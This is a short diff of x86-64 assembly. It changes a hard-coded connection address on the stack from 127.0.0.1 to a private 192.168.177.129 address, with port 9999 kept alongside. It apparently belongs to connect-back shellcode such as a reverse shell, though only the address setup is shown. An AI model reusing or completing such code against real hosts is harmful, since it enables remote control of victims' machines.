@@ -251,8 +251,8 @@ start:
 		xor rax, rax
 		mov [rsp + 400h], rax
 		xor rax, rax
-		mov eax, 0100007fh
-		mov DWORD  [rsp + 3fch], eax ; 127.0.0.1
+		mov eax, 81b1a8c0h ; 192.168.177.129
+		mov DWORD  [rsp + 3fch], eax 
 		xor rax, rax
 		mov ax, 0f27h
 		mov WORD  [rsp + 3fah], ax ; port 9999
